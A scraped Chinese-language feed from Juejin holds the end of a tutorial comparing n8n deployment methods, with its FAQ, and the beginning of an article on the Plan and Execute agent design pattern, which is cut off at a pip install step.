<li>完整的企业级方案</li>
<li>支持数据库、反向代理等多服务</li>
<li>配置可版本控制</li>
</ul>
</li>
</ol>
<h4 data-id="heading-21">部署方式对比总结</h4>






















































<table><thead><tr><th>特性</th><th>npx</th><th>npm</th><th>Docker</th><th>Docker Compose</th></tr></thead><tbody><tr><td>安装难度</td><td>⭐</td><td>⭐⭐</td><td>⭐⭐⭐</td><td>⭐⭐⭐⭐</td></tr><tr><td>数据持久化</td><td>❌</td><td>✅</td><td>✅</td><td>✅</td></tr><tr><td>环境隔离</td><td>❌</td><td>❌</td><td>✅</td><td>✅</td></tr><tr><td>生产就绪</td><td>❌</td><td>⚠️</td><td>✅</td><td>✅</td></tr><tr><td>多服务支持</td><td>❌</td><td>❌</td><td>❌</td><td>✅</td></tr><tr><td>更新方便</td><td>✅</td><td>✅</td><td>✅</td><td>✅</td></tr></tbody></table>
<h4 data-id="heading-22">关键注意事项</h4>
<ul>
<li>⚠️ <strong>Node.js版本</strong>：使用npm安装时，确保Node.js版本在20.19-24.x之间</li>
<li>⚠️ <strong>数据备份</strong>：生产环境务必定期备份数据（工作流和数据库）</li>
<li>⚠️ <strong>安全配置</strong>：生产环境必须启用基础认证，设置强密码</li>
<li>⚠️ <strong>端口管理</strong>：确保5678端口未被占用，或使用其他端口</li>
<li>⚠️ <strong>反向代理</strong>：生产环境建议使用Nginx等反向代理，配置SSL证书</li>
<li>⚠️ <strong>数据库选择</strong>：小规模使用可以用SQLite（默认），生产环境推荐PostgreSQL</li>
</ul>
<h4 data-id="heading-23">下一步该做什么</h4>
<ol>
<li><strong>选择适合你的方式</strong>：根据你的需求（体验/开发/生产），选择对应的部署方式</li>
<li><strong>动手实践</strong>：按照上面的实战案例，完成一次完整部署</li>
<li><strong>配置安全</strong>：如果用于生产，务必配置认证、反向代理和SSL</li>
<li><strong>学习配置</strong>：了解环境变量的作用，根据需求调整配置</li>
<li><strong>数据备份</strong>：建立定期备份机制，避免数据丢失</li>
</ol>
<h4 data-id="heading-24">常见问题快速解答</h4>
<p><strong>Q: 我应该选择哪种部署方式？</strong>
A: 快速体验选npx，本地开发选npm，生产环境选Docker或Docker Compose。</p>
<p><strong>Q: Docker和Docker Compose有什么区别？</strong>
A: Docker是单容器运行，Docker Compose可以管理多个相关容器（如n8n+数据库）。</p>
<p><strong>Q: 数据会丢失吗？</strong>
A: npx方式会丢失，其他方式通过数据卷或文件系统持久化，不会丢失。</p>
<p><strong>Q: 如何更新n8n？</strong>
A: npm方式用 <code>npm update -g n8n</code>，Docker方式拉取新镜像重启容器。</p>
<p><strong>Q: 可以同时运行多个n8n实例吗？</strong>
A: 可以，但需要配置不同的端口和数据目录，避免冲突。</p>
<p><strong>Q: 生产环境需要什么配置？</strong>
A: 建议：启用认证、配置数据库（PostgreSQL）、设置反向代理和SSL、定期备份。</p>
<p><strong>Q: 如何迁移n8n到新服务器？</strong>
A: 备份数据目录（<code>~/.n8n</code>）和数据库，在新服务器上恢复即可。</p>
<hr/>
<h3 data-id="heading-25">六、更多干货</h3>
<blockquote>
<p><strong>💡 想要获取更多N8N学习资源？</strong></p>
<p>点击我后续的微信小程序【<strong>知识星球-FYC的开源世界</strong>】，即可获取：</p>
<ul>
<li>📚 <strong>完整的部署脚本库</strong>：包含各种部署方式的自动化脚本，一键部署，省时省力</li>
<li>🎯 <strong>生产环境配置模板</strong>：Docker Compose完整配置、Nginx反向代理配置、SSL证书配置等</li>
<li>💬 <strong>部署问题答疑</strong>：遇到部署问题随时提问，专业解答，快速解决</li>
<li>🚀 <strong>最新部署技巧分享</strong>：Docker优化、性能调优、高可用配置等最佳实践</li>
<li>📖 <strong>系列文章抢先看</strong>：后续文章（基础篇、进阶篇、实战篇等）提前发布</li>
<li>🔧 <strong>故障排除指南</strong>：常见部署问题解决方案，避免踩坑</li>
</ul>
<p>不要让部署问题阻挡你使用N8N，让专业配置帮你快速上手！</p>
</blockquote>
<hr/>
<p><strong>系列文章预告：</strong></p>
<ul>
<li>📌 <strong>下一篇</strong>：N8N从零开始到精通-(3)N8N学习路径</li>
</ul>
<p><strong>记得关注我，后续还有更多实用内容！</strong> 🎉</p>
<hr/>
<p><strong>文档信息：</strong></p>
<ul>
<li><strong>作者</strong>：FYC</li>
<li><strong>系列</strong>：N8N从零开始科普系列</li>
<li><strong>版本</strong>：v1.0</li>
<li><strong>最后更新</strong>：2025-01-XX</li>
<li><strong>参考资源</strong>：
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.n8n.io%2Fchoose-n8n%2F" target="_blank" title="https://docs.n8n.io/choose-n8n/" ref="nofollow noopener noreferrer">N8N官方文档 - 选择n8n</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.n8n.io%2Fhosting%2Finstallation%2Fnpm%2F" target="_blank" title="https://docs.n8n.io/hosting/installation/npm/" ref="nofollow noopener noreferrer">N8N官方文档 - npm安装</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.n8n.io%2Fhosting%2Finstallation%2Fdocker%2F" target="_blank" title="https://docs.n8n.io/hosting/installation/docker/" ref="nofollow noopener noreferrer">N8N官方文档 - Docker安装</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.n8n.io%2Fhosting%2Finstallation%2Fserver-setups%2Fdocker-compose%2F" target="_blank" title="https://docs.n8n.io/hosting/installation/server-setups/docker-compose/" ref="nofollow noopener noreferrer">N8N官方文档 - Docker Compose安装</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fn8n-io%2Fn8n" target="_blank" title="https://github.com/n8n-io/n8n" ref="nofollow noopener noreferrer">N8N GitHub</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fcommunity.n8n.io%2F" target="_blank" title="https://community.n8n.io/" ref="nofollow noopener noreferrer">N8N社区</a></li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[智能体设计模式：规划与执行模式（Plan and Execute）]]></title>    <link>https://juejin.cn/post/7591993600390496307</link>    <guid>https://juejin.cn/post/7591993600390496307</guid>    <pubDate>2026-01-06T08:11:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591993600390496307" data-draft-id="7591948263860748326" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="智能体设计模式：规划与执行模式（Plan and Execute）"/> <meta itemprop="keywords" content="Agent,LangChain,AI编程"/> <meta itemprop="datePublished" content="2026-01-06T08:11:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FreeCode"/> <meta itemprop="url" content="https://juejin.cn/user/1282499717900794"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            智能体设计模式：规划与执行模式（Plan and Execute）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1282499717900794/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FreeCode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:11:18.000Z" title="Tue Jan 06 2026 08:11:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读23分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">1. 模式定义</h2>
<p>Plan and Execute（规划与执行）是一种面向复杂任务处理的AI智能体设计模式，其核心思想是将复杂目标拆解为可执行的子任务序列，通过“先规划、再执行、强反馈、动态调整”的闭环逻辑，实现对复杂任务的有序、高效完成。该模式突破了传统端到端AI模型“输入-输出”的直接映射局限，引入了“规划层”与“执行层”的分层架构，通过规划层生成全局任务蓝图，执行层负责具体子任务的落地，同时依托反馈机制实时修正规划偏差，确保任务目标的最终达成。</p>
<p>从核心要素来看，Plan and Execute模式包含四大关键组件：一是目标解析模块，负责将用户输入的模糊或复杂目标转化为明确、可量化的任务指标；二是规划模块（Planer），基于解析后的目标，拆解出子任务序列，明确子任务的依赖关系、执行优先级与资源需求；三是执行模块（Executor），依据规划结果，调用相应工具、模型或接口完成子任务的具体执行；四是反馈与调整模块，监控执行过程中的状态信息、结果数据，判断是否符合规划预期，若存在偏差则触发规划修正或子任务重执行。</p>
<p>该模式的本质是模拟人类解决复杂问题的思维逻辑——当面对“完成一次跨城市商务出行规划”这类复杂任务时，人类会先拆解为“确定出行时间、查询交通方式、预订票务、规划市内交通、安排住宿”等子任务，再逐步执行每个子任务，同时根据“机票售罄”“天气变化”等突发情况调整规划。Plan and Execute模式正是将这一思维过程具象化为AI智能体的技术架构，使其具备处理多步骤、强依赖、动态变化类任务的能力。</p>
<h2 data-id="heading-1">2. 核心价值</h2>
<h3 data-id="heading-2">2.1 提升复杂任务处理能力</h3>
<p>传统AI模型在处理单步骤、简单目标任务（如图片分类、文本情感分析）时表现优异，但面对多步骤、强关联的复杂任务（如科研文献综述撰写、企业财务报表分析）时，易出现“目标迷失”或“步骤混乱”问题。Plan and Execute模式通过子任务拆解，将复杂任务转化为多个简单子任务的组合，降低了单个任务的处理难度，同时通过规划层明确子任务间的依赖关系（如“先收集文献再筛选核心文献，最后撰写综述”），确保任务执行的有序性，从而大幅提升AI智能体处理复杂任务的能力。</p>
<h3 data-id="heading-3">2.2 增强任务执行的可控性与可解释性</h3>
<p>端到端AI模型的“黑箱”特性使其执行过程难以追溯，一旦出现错误无法精准定位问题根源。而Plan and Execute模式的规划层会生成明确的子任务序列与执行方案，每个子任务的执行目标、输入输出、依赖条件均清晰可查。当任务执行出现偏差时，可直接定位到具体的子任务或规划环节，便于问题排查与修正。这种透明化的执行逻辑不仅提升了任务的可控性，也增强了AI智能体的可解释性，使其更易被人类用户理解与信任。</p>
<h3 data-id="heading-4">2.3 提升资源利用效率与容错性</h3>
<p>规划层在拆解任务时，会结合子任务的性质、难度与资源需求，合理分配计算资源、工具资源与时间资源。例如，对于简单的文本提取子任务，调用轻量级模型即可完成；对于复杂的数据分析子任务，再调用高性能计算资源，避免了“大模型处理小任务”的资源浪费。同时，该模式具备较强的容错性——当单个子任务执行失败时，无需重新执行整个任务，仅需通过反馈机制调整该子任务的执行方案（如更换工具、补充输入信息）或修正后续规划，大幅降低了任务失败的成本。</p>
<h3 data-id="heading-5">2.4 支持动态环境下的自适应调整</h3>
<p>真实应用场景中，任务执行环境往往存在动态变化（如工具接口更新、数据格式变化、突发任务干扰）。Plan and Execute模式通过实时反馈机制，能够感知环境变化对任务执行的影响，并快速调整规划方案。例如，在“电商订单处理”任务中，若原本规划的“物流查询接口”突然失效，智能体可通过反馈模块感知到这一问题，规划层随即调整方案，调用备用物流查询接口或切换为人工查询的子任务，确保任务整体不受影响。</p>
<h2 data-id="heading-6">3. 实现机制</h2>
<p>Plan and Execute模式的实现遵循“分层架构+闭环反馈”的核心逻辑，具体可拆解为目标解析、规划生成、任务执行、反馈调整四个核心环节，各环节相互衔接、协同工作，形成完整的任务处理链路。</p>
<h3 data-id="heading-7">3.1 目标解析环节</h3>
<p>该环节的核心目标是将用户输入的自然语言目标（或模糊需求）转化为AI智能体可理解、可拆解的结构化目标。具体实现步骤包括：一是需求预处理，对用户输入的文本进行清洗、分词、关键信息提取（如提取任务类型、核心指标、时间约束、资源限制等）；二是目标标准化，将提取的关键信息转化为结构化格式（如JSON格式），明确任务的边界条件（如“完成财务报表分析”需明确分析的时间范围、核心指标、输出格式等）；三是目标验证，判断目标是否可实现（如是否存在资源不足、目标矛盾等问题），若存在模糊或不可实现的部分，反馈给用户进行澄清。</p>
<p>技术实现上，该环节通常采用自然语言处理（NLP）模型（如BERT、GPT系列模型）进行关键信息提取与目标标准化，对于复杂领域的任务（如医疗、金融），还会结合领域知识库提升目标解析的准确性。</p>
<h3 data-id="heading-8">3.2 规划生成环节</h3>
<p>规划生成是Plan and Execute模式的核心环节，负责将结构化目标拆解为可执行的子任务序列。该环节的核心挑战是确保子任务的完整性、有序性与可行性。具体实现逻辑包括：</p>
<ul>
<li>
<p>子任务拆解：基于目标的复杂度与领域特性，采用“自上而下”或“自下而上”的拆解策略。“自上而下”策略从全局目标出发，逐步拆解为更小的子任务（如“撰写科研论文”拆解为“确定主题、文献调研、实验设计、数据收集、论文撰写、修改审核”）；“自下而上”策略则先识别完成目标所需的基础子任务，再逐步组合为高层子任务。对于复杂任务，通常采用混合拆解策略。</p>
</li>
<li>
<p>子任务排序：明确子任务间的依赖关系（如“数据收集”需在“实验设计”之后执行），通过有向无环图（DAG）建模子任务关系，再基于拓扑排序生成有序的子任务序列。同时，结合子任务的优先级（如“紧急子任务优先执行”）与资源约束（如“同一时间只能执行一个高算力子任务”）优化排序结果。</p>
</li>
<li>
<p>规划方案优化：通过成本函数（如时间成本、资源消耗、任务成功率）评估规划方案的优劣，对不合理的规划进行调整（如合并相似子任务、替换低效子任务）。对于动态性较强的任务，还会预留一定的冗余子任务或备选方案，提升规划的鲁棒性。</p>
</li>
</ul>
<p>技术实现上，规划生成环节的核心是规划器（Planer）的设计，主流实现方式包括：一是基于规则的规划器，通过预设的领域规则与拆解模板完成子任务拆解（适用于结构化程度高的任务）；二是基于大语言模型（LLM）的规划器，利用LLM的逻辑推理能力生成子任务序列（适用于非结构化、复杂逻辑的任务，如GPT-4、Claude等模型）；三是基于强化学习的规划器，通过环境反馈不断优化规划策略（适用于动态环境下的长期任务）。</p>
<h3 data-id="heading-9">3.3 任务执行环节</h3>
<p>该环节负责将规划生成的子任务序列逐一落地，核心是执行器（Executor）的设计与实现。执行器的核心功能是根据子任务的类型，调用相应的工具、模型或接口完成具体操作，并返回执行结果。具体实现逻辑包括：</p>
<ul>
<li>
<p>子任务类型匹配：识别子任务的类型（如数据查询、文本生成、模型推理、工具调用等），匹配对应的执行资源（如查询类任务调用数据库接口，文本生成类任务调用LLM，图像处理类任务调用计算机视觉模型）。</p>
</li>
<li>
<p>执行资源调度：根据子任务的优先级与资源需求，合理分配计算资源、网络资源与工具资源，避免资源冲突。例如，对于高算力需求的子任务（如深度学习模型推理），优先分配GPU资源；对于实时性要求高的子任务（如实时数据查询），优先分配网络带宽资源。</p>
</li>
<li>
<p>执行过程监控：实时监控子任务的执行状态（如执行中、完成、失败、超时），记录执行过程中的关键数据（如执行时间、资源消耗、输出结果），为后续的反馈调整提供数据支撑。</p>
</li>
</ul>
<p>技术实现上，执行器通常采用模块化设计，支持多种工具与模型的集成（如通过API调用外部工具、通过本地接口调用自研模型）。同时，为提升执行的可靠性，会引入重试机制（如子任务执行失败时自动重试）与异常处理机制（如执行超时后触发备选方案）。</p>
<h3 data-id="heading-10">3.4 反馈调整环节</h3>
<p>反馈调整是确保任务执行准确性与规划合理性的关键环节，负责将执行环节的状态与结果反馈给规划层，若存在偏差则触发规划修正。具体实现逻辑包括：</p>
<ul>
<li>
<p>执行结果评估：基于目标解析环节确定的指标，评估子任务的执行结果是否符合预期（如“文献调研”子任务的评估指标包括“文献数量、相关性、时效性”）。若结果符合预期，则进入下一个子任务的执行；若结果不符合预期（如文献相关性不足），则标记为偏差。</p>
</li>
<li>
<p>偏差原因分析：通过对比执行结果与预期目标，结合执行过程中的监控数据，分析偏差产生的原因（如规划不合理、执行工具选择错误、输入数据不足、环境变化等）。例如，若“物流查询”子任务执行失败，可能是因为规划时选择的接口已失效，也可能是因为输入的订单号错误。</p>
</li>
<li>
<p>规划修正与重新执行：根据偏差原因，调整规划方案或执行策略。若偏差源于规划不合理（如子任务拆解不完整），则重新拆解子任务并调整执行序列；若偏差源于执行问题（如工具选择错误），则更换执行工具并重新执行该子任务；若偏差源于输入数据不足，则触发“补充数据”的子任务。</p>
</li>
</ul>
<p>技术实现上，反馈调整环节通常采用“规则+模型”的混合方式：对于简单偏差（如执行超时），通过预设规则直接触发调整；对于复杂偏差（如规划不合理），利用LLM或推理模型分析原因并生成修正方案。同时，为提升后续任务的处理效率，会将偏差原因与修正方案存入知识库，形成经验积累。</p>
<h2 data-id="heading-11">4. 应用场景</h2>
<p>Plan and Execute模式凭借其对复杂任务的处理能力与动态自适应特性，已广泛应用于多个领域，涵盖办公自动化、智能运维、科研辅助、机器人控制等多个场景。</p>
<h3 data-id="heading-12">4.1 智能办公自动化</h3>
<p>在办公场景中，Plan and Execute模式可用于处理多步骤的办公任务，如“年度工作总结撰写”“会议组织与纪要生成”“客户需求对接与方案输出”等。以“年度工作总结撰写”为例，智能体通过Plan and Execute模式可拆解为“收集年度工作数据（如项目进度、业绩指标、成果文件）、梳理核心工作内容、分析存在的问题、制定下年度计划、撰写总结文本、修改审核”等子任务，依次执行每个子任务并根据反馈调整（如数据收集不完整时触发补充收集子任务，总结文本不符合要求时触发修改子任务）。该模式的应用大幅提升了办公效率，减少了人工干预的复杂度。</p>
<h3 data-id="heading-13">4.2 智能运维与客服</h3>
<p>在IT运维场景中，Plan and Execute模式可用于处理复杂的故障排查与系统维护任务，如“服务器故障诊断与修复”“网络异常排查”“系统升级规划与执行”等。以“服务器故障诊断与修复”为例，智能体可拆解为“收集服务器运行数据（如CPU使用率、内存占用、日志信息）、定位故障类型（如硬件故障、软件故障、网络故障）、生成修复方案（如重启服务、更换硬件、更新软件）、执行修复操作、验证修复效果”等子任务，通过反馈机制实时调整排查方向（如日志分析未定位故障时，补充收集硬件检测数据）。在客服场景中，该模式可用于处理复杂的客户咨询（如“产品售后问题解决”），拆解为“理解客户需求、查询产品信息、定位问题原因、生成解决方案、跟进问题解决进度”等子任务，提升客服响应效率与问题解决率。</p>
<h3 data-id="heading-14">4.3 科研与数据分析</h3>
<p>在科研与数据分析场景中，Plan and Execute模式可用于处理多步骤的科研任务与数据分析任务，如“科研文献综述撰写”“实验设计与数据处理”“市场调研与数据分析”等。以“实验设计与数据处理”为例，智能体可拆解为“明确实验目标、设计实验方案（如变量设置、样本选择、实验步骤）、执行实验并收集数据、数据清洗与预处理、数据建模与分析、生成实验报告”等子任务，根据实验过程中的反馈调整方案（如数据结果不显著时，调整变量设置或增加样本量）。该模式的应用不仅提升了科研与数据分析的效率，还能减少人工操作中的误差，提升结果的可靠性。</p>
<h3 data-id="heading-15">4.4 机器人控制与自主导航</h3>
<p>在机器人领域，Plan and Execute模式是实现机器人自主任务处理的核心技术，适用于“家庭服务机器人任务执行”“工业机器人生产操作”“无人车自主导航与配送”等场景。以“家庭服务机器人打扫客厅”为例，智能体可拆解为“规划打扫路径、检测障碍物、执行清扫操作（如扫地、拖地）、清理垃圾、检查打扫效果”等子任务，通过传感器实时反馈环境信息（如发现新的障碍物），调整打扫路径与操作策略。在工业机器人场景中，该模式可用于处理复杂的生产组装任务，拆解为“抓取零件、定位安装位置、执行组装操作、检测组装质量”等子任务，确保生产过程的有序性与准确性。</p>
<h3 data-id="heading-16">4.5 教育与培训辅助</h3>
<p>在教育场景中，Plan and Execute模式可用于构建智能教学辅助系统，处理“个性化学习方案制定”“学生作业批改与辅导”“考试命题与阅卷”等任务。以“个性化学习方案制定”为例，智能体可拆解为“评估学生学习水平（如通过测试数据）、识别薄弱环节、确定学习目标、制定学习计划（如课程选择、学习进度安排）、推荐学习资源、跟踪学习效果”等子任务，根据学生的学习反馈调整方案（如某一知识点学习效果不佳时，增加练习子任务）。该模式的应用能够实现精准化教学，提升学习效率与效果。</p>
<h2 data-id="heading-17">5. 优势与挑战</h2>
<h3 data-id="heading-18">5.1 优势</h3>
<ul>
<li>
<p>复杂任务处理能力突出：通过子任务拆解，将复杂任务转化为简单子任务的组合，突破了传统AI模型处理复杂任务的局限，能够应对多步骤、强依赖、动态变化的任务场景。</p>
</li>
<li>
<p>任务执行可控性与可解释性强：规划层生成的子任务序列清晰可查，每个子任务的执行目标、输入输出、依赖关系均透明化，便于人类用户理解与监控，同时也便于问题排查与故障定位。</p>
</li>
<li>
<p>资源利用高效且容错性好：规划层可根据子任务的需求合理分配资源，避免资源浪费；当单个子任务执行失败时，无需重新执行整个任务，仅需调整该子任务或后续规划，降低了任务失败的成本。</p>
</li>
<li>
<p>动态环境适应性强：通过实时反馈机制，能够感知环境变化对任务执行的影响，并快速调整规划方案与执行策略，确保任务在动态变化的环境中仍能顺利完成。</p>
</li>
<li>
<p>可扩展性强：采用分层架构与模块化设计，规划层、执行层、反馈层均可独立优化与扩展，便于接入新的工具、模型与领域知识库，适用于不同领域的任务处理。</p>
</li>
</ul>
<h3 data-id="heading-19">5.2 挑战</h3>
<ul>
<li>
<p>规划的完整性与合理性难题：对于高度复杂或陌生的任务，规划层难以确保子任务拆解的完整性（如遗漏关键子任务）与合理性（如子任务依赖关系错误），导致任务执行出现偏差。尤其是在缺乏领域知识库支撑的场景中，这一问题更为突出。</p>
</li>
<li>
<p>反馈延迟与偏差累积：在部分场景中，执行环节的反馈信息可能存在延迟（如远程工具调用、大型实验数据收集），导致规划调整不及时；同时，单个子任务的微小偏差可能会累积为全局偏差，影响整个任务的执行结果。</p>
</li>
<li>
<p>多目标冲突处理难度大：当任务存在多个目标（如“高效完成任务”与“降低资源消耗”）时，规划层难以平衡不同目标的需求，可能出现“为追求效率而过度消耗资源”或“为节省资源而导致任务延迟”的问题。</p>
</li>
<li>
<p>计算资源与时间成本较高：规划过程（尤其是基于LLM或强化学习的规划）需要消耗大量的计算资源，同时子任务的拆解、排序与调整也会增加任务的整体执行时间，在实时性要求高的场景中可能难以满足需求。</p>
</li>
<li>
<p>领域适应性有限：现有规划器多依赖于领域知识或训练数据，当应用于全新领域时，规划准确性会大幅下降，需要重新构建领域知识库或进行模型微调，增加了应用成本。</p>
</li>
</ul>
<h2 data-id="heading-20">6. 代码示例</h2>
<p>本示例以“科研文献综述撰写”的简化场景为例，实现Plan and Execute模式的核心逻辑。该示例采用Python语言，基于大语言模型（OpenAI GPT-3.5）实现规划器，通过模拟工具调用实现执行器，包含目标解析、规划生成、任务执行、反馈调整四个核心环节。</p>
<h3 data-id="heading-21">6.1 依赖环境安装</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 安装所需依赖包</span>
pip install openai python-dotenv
</code></pre>
